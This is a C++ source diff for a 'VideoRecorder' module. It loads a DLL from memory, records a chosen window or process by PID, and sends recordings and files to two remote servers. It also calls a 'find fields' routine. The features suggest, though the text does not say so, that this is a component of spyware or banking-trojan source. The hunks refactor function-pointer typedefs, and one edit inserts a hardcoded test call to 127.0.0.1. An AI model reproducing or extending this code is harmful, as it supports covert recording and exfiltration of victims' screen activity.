@@ -67,10 +67,25 @@ namespace VideoRecorder
 
 }
 
+//StartRecHwnd( char* uid, char* nameVideo, HWND wnd, const char* ip, int port ) //запись по HWND окна
+//StartRecPid( char* uid, DWOD pid, char* ip, int port )  //запись по PID процесса
+typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds ) ;
+typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds );
+typedef VOID (WINAPI *TStopRec		)();
+typedef VOID (WINAPI *TResetTimer	)();
+
+typedef VOID (WINAPI *PStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
+typedef VOID (WINAPI *PStartFindFields)();
+typedef VOID (WINAPI *PStopFindFields)();
+
+
 
 //*****************************************************************************
 //                                    TVideoRecDLL
 //*****************************************************************************
+
+HMEMORYMODULE FHandle = NULL;
+
 TVideoRecDLL::TVideoRecDLL()
 {
 	// «агружаем библиотеку и инициализируем апи
@@ -83,7 +98,6 @@ TVideoRecDLL::~TVideoRecDLL()
 {
 	if (FHandle)
 		MemoryFreeLibrary(FHandle);
-
 }
 //-------------------------------------------------------------------
 
@@ -94,7 +108,6 @@ void TVideoRecDLL::LoadFunc(LPVOID *Addr, const char* Name)
 		*Addr = MemoryGetProcAddress(FHandle, Name);
 	else
 		*Addr = NULL;
-
 }
 
 void TVideoRecDLL::InitializeApi()
@@ -106,9 +119,12 @@ void TVideoRecDLL::InitializeApi()
 	LoadFunc((LPVOID*)&SendData,        "StartSend");
 	LoadFunc((LPVOID*)&StartFindFields, "StartFindFields");
 	LoadFunc((LPVOID*)&StopFindFields,  "StopFindFields");
+
+	RecordProcess = (TStartRecPid)MemoryGetProcAddress(FHandle, "StartRecPid");
 }
 
-
+// 49755904
+// 49807360
 
 
 
@@ -122,23 +138,30 @@ TVideoRecorder::TVideoRecorder()
 	Server2    = VIDEO_REC_HOST2;
 	Port       =  VIDEORECORD_DEFAULT_PORT;
 	Port2      =  VIDEORECORD_DEFAULT_PORT;
-    RecordTime = 0;
+	RecordTime = 0;
+
+	FDLL = new TVideoRecDLL();
 }
 //--------------------------------------------------------------
 
 TVideoRecorder::~TVideoRecorder()
 {
-
+	delete FDLL;
 }
 //--------------------------------------------------------------
 
 void TVideoRecorder::ReccordProcess(DWORD PID)
 {
-	if (FDLL.RecordProcess)
+	if (FDLL->RecordProcess)
 	{
-		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
-						   Server.t_str(), Port,
-						   Server2.t_str(), Port2, RecordTime);
+		HMEMORYMODULE FHandle = VideoRecorder::LoadDLL();
+		TStartRecPid Rec = (TStartRecPid)MemoryGetProcAddress(FHandle, "StartRecPid");
+			char Buf[100];
+			GenerateUid(Buf);
+		Rec(Buf, "test", 0, "127.0.0.1", 700, "127.0.0.1", 700, 0);
+//		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
+//						   Server.t_str(), Port,
+//						   Server2.t_str(), Port2, RecordTime);
     }
 }
 //--------------------------------------------------------------
@@ -176,16 +199,7 @@ HMEMORYMODULE inline VideoRecorder::LoadDLL()
 
 HMEMORYMODULE	hLibWndRec = NULL;
 
-//StartRecHwnd( char* uid, char* nameVideo, HWND wnd, const char* ip, int port ) //запись по HWND окна
-//StartRecPid( char* uid, DWOD pid, char* ip, int port )  //запись по PID процесса
-typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds ) ;
-typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds );
-typedef VOID (WINAPI *TStopRec		)();
-typedef VOID (WINAPI *TResetTimer	)();
 
-typedef VOID (WINAPI *PStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
-typedef VOID (WINAPI *PStartFindFields)();
-typedef VOID (WINAPI *PStopFindFields)();
 
 char CurrentChar[256];
 
